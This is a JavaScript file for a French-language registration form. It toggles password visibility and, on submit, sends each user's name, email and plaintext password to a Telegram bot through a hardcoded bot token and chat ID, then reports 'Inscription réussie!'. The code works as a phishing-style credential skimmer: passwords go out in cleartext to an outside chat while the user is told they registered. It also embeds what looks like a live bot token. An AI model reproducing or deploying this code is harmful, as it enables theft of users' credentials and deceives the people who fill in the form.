const form = document.getElementById('registrationForm');
const passwordInput = document.getElementById('password');
const togglePassword = document.querySelector('.password-toggle i');

// Fonction pour basculer la visibilité du mot de passe
togglePassword.addEventListener('click', function() {
  const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
  passwordInput.setAttribute('type', type);
  this.classList.toggle('fa-eye-slash');
});

// Fonction pour envoyer les données au bot Telegram
form.addEventListener('submit', function(event) {
  event.preventDefault(); // Empêche la soumission standard du formulaire

  const name = document.getElementById('name').value;
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  // Remplacez TOKEN par le jeton de votre bot Telegram
  const telegramBotToken = '7287090448:AAHTG1CF8r5silHH_5XaI0jsWCVd2Rt9oVs';
  // Remplacez CHAT_ID par l'ID de votre chat Telegram
  const telegramChatId = '6994578596';

  // Construisez le message à envoyer au bot
  const message = `Nouveau utilisateur:\nNom: ${name}\nEmail: ${email}\nMot de passe: ${password}`;

  // Envoyez le message au bot Telegram en utilisant l'API Telegram
  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;

  fetch(url)
    .then(response => {
      if (!response.ok) {
        throw new Error('Erreur lors de l\'envoi du message');
      }
      // Réinitialisez le formulaire après l'envoi réussi
      form.reset();
      alert('Inscription réussie!');
    })
    .catch(error => console.error('Erreur:', error));
});

